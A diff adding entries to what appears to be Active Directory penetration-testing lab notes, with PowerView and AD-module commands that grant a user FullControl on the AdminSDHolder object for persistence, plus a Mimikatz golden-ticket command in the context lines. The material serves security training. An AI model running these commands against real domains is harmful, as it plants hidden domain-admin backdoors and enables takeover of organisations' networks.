@@ -479,3 +479,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 
 - With DA privileges (Full Control/Write permissions) on the AdminsSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
 - In 60 minutes (when SDPROP runs), the user will be added with Full Control to the ACL of groups like Domain Admins without actually being a member of it.
+
+**Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA**
+- `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -verbose`
+- Run Invoke-SDPropagator to make it effective right away. Otherwise SD Progagator will run automatically on each hour.
+  - `. .\Invoke-SDPropagator.ps1`
+  - `Invoke-SDPropagator -showProgress -timeoutMinutes 1`
+
+**Using ActiveDirectory Module of Set-ADACL**
+- `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal studen1 -Verbose` 
+
+****
